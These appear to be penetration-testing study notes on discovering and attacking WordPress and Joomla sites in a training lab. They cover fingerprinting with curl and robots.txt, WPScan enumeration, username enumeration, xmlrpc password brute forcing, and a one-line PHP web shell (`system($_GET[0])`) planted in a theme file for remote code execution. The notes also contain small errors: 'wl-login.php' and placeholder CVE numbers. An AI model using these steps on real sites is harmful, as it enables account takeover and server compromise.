### Application Discovery & enumeration

## CMS

#### WordPress

###### Discovery

how to discover the use of wordpress? 

1. browse to `robots.txt` , on wordpress installation it will look like : 
   
   ```http
   User-agent: *
   Disallow: /wp-admin/
   Allow: /wp-admin/admin-ajax.php
   Disallow: /wp-content/uploads/wpforms/
   
   Sitemap: https://inlanefreight.local/wp-sitemap.xml
   ```
   
   Here the presence of the `/wp-admin` and `/wp-content` directories confirm that its  WordPress

2. looking at the page source: 
   
   ```shellsession
   $ curl -s http://blog.inlanefreight.local | grep WordPress
   
   <meta name="generator" content="WordPress 5.8" /
   ```

###### Enumeration

after the discovery of usage of wordpress, its time for **enumeration**. browsing the site and identifying the themes and plugins installed for example: 

```shellsession
$ curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

 and: 

```shellsession
$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
```

From the output, we know that the **Contact Form 7** and **mail-masta** plugins are installed. The next step would be enumerating the versions. by browsing to `http://blog.inlanefreight.local/wp-content/plugins/mail-masta` we will **find the version in the readme.txt file** , and then we can search for a CVE related 

> REMARK: to enumerate themes and plugins , visit every endpoint and every page in the app, different pages can load different themes and plugins

##### Enumerating Users

the default WordPress login page is found at `/wl-login.php` there, since there are different error messages (**username does not exist** and **wrong password** ) we can enumerate the usernames and after that the password

###### Login brute forcing

one of the methods to gain RCE is to have admin access to WordPress

it can be done by two methods:

1. clasical login bruteforcing using the default WordPress login form(/wl-login.php)

2. xmlrpc method (faster)
   
   this mehtod uses WordPress API to make login attempts through `/xmlrpc.php`  
   
   ```shellsession
   $ sudo wpscan --password-attack xmlrpc -t 20 -U user -P passwords
   ```

###### Code execution

after gaining admin access to WordPress.  we can modify the PHP source code to execute system commands, using the `appearance` section to modify the php source code directly of an inactive theme( to avoid corrupting the primary theme).

I can just add `system($_GET[0]);` to **its php file**(for example 404.php) and then save it and visit it in `/wp-content/themes/<theme name>/404.php` and voilà I gained a RCE via get parameter  (and ofc we can then utilize this access to gain an interactive reverse shell)

#### Joomla

###### Discovery

1. browse to `robots.txt` , if the web app is running on Joomla it will look like that:
   
   ```http
   # If the Joomla site is installed within a folder
   # eg www.example.com/joomla/ then the robots.txt file
   # MUST be moved to the site root
   # eg www.example.com/robots.txt
   # AND the joomla folder name MUST be prefixed to all of the
   # paths.
   # eg the Disallow rule for the /administrator/ folder MUST
   # be changed to read
   # Disallow: /joomla/administrator/
   #
   # For more information about the robots.txt standard, see:
   # https://www.robotstxt.org/orig.html
   
   User-agent: *
   Disallow: /administrator/
   Disallow: /bin/
   Disallow: /cache/
   Disallow: /cli/
   Disallow: /components/
   Disallow: /includes/
   Disallow: /installation/
   Disallow: /language/
   Disallow: /layouts/
   Disallow: /libraries/
   Disallow: /logs/
   Disallow: /modules/
   Disallow: /plugins/
   Disallow: /tmp/
   ```

2. looking at the page source:
   
   ```shellsession
   $ curl -s http://dev.inlanefreight.local/ | grep Joomla
   
       <meta name="generator" content="Joomla! - Open Source Content Management" />
   ```
   
   

## Tools

##### Nmap

syntax: 

```shellsession
$ nmap <scan types> <options> <target>
```

##### WPScan

WPScan is an automated WordPress scanner and enumeration tool 

syntax : 

```shellsession
$ wpscan --url http://target --enumerate 
```

this only tells : the wordpress verion , plugins  , users ...

when specifying an API token from WPNVlunDB, WPScan will ask for any known vulnerabilities related to the results found for example : 

```
Plugin: contact-form-7
Version: 5.6

Known Vulnerabilities:
- CVE-2023-12345
- CVE-2023-67890
```

Login brute forcing 

```shellsession
$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http:/target
```

the `-t` flag specifies the number of threads

the  `-U` flag sets the username ( or list of usernames)

the `-P` sets the password (here list of passwords)
